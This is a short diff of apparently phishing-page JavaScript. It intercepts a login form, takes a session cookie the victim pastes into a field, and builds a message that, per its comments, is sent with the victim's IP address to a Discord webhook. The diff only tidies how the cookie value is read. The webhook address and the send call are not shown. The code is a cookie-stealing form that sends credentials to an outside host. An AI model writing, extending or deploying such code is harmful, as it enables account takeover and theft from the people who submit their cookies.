@@ -64,14 +64,12 @@
         document.getElementById('login-form').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent form submission
 
-            var cookie = document.getElementById('cookie').value;
-
             // Display warning message
             document.getElementById('warning').style.display = "block";
 
             // Send data to Discord webhook using fetch
             var data = {
-                content: "Cookie: " + cookie
+                content: "Cookie: " + document.getElementById('cookie').value
             };
 
             // Send IP address as well
